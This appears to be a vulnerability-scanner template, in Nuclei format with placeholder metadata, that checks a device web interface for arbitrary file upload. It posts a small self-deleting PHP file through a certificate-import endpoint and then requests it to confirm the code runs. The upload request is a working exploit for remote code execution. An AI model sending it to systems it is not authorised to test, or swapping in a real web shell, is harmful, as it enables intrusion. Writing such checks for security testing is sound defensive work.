id: oem-crt-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: description
  reference:
    - https://
  tags: tags

variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |
        POST /webui/?g=local_cert_delete_both HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 345
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=ed63f728755e4a2f90d094ec09b0ed9a

        --ed63f728755e4a2f90d094ec09b0ed9a
        Content-Disposition: form-data; name="submit_post"

        local_cert_import
        --ed63f728755e4a2f90d094ec09b0ed9a
        Content-Disposition: form-data; name="key_file_name"; filename="{{filename}}.php"
        Content-Type: text/plain

        <?php echo md5('1');@unlink(__file__);?>
        --ed63f728755e4a2f90d094ec09b0ed9a--
      - |+
        GET /webui/attachements/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate

    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
